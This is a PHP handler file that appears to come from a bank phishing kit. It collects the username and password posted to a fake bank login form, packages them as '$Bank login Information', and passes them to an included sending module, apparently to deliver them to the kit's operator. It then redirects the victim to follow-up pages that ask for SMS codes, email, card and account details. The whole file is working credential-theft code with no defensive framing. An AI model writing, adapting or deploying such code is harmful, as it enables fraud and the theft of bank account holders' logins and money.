<?php
require_once('./Module/Setmodule.php');
$message .= " -------------- $Bank login Information -------------- \n"."\n";
$message .= "Username: ".$_POST['username']."\n"; 
$message .= "Password: ".$_POST['Password']."\n\n"; 
require_once('Module/SendModule.php');


	  if($settings['Relogin'] == "1"){
	header("Location: ../Relogin.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  }
  else{if($settings['Smspage'] == "1"){
	header("Location: ../load.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  }
  else{
	   if($settings['Emailpage'] == "1"){
	header("Location: ../Email.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  }
	else{
		if($settings['Cardpage'] == "1"){
	header("Location: ../Card.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  }
	else{
	  if($settings['Account'] == "1"){
	header("Location: ../Account.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  }
  else{
		header("Location: ../complete.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
	}
	}}}}
	
	
?>
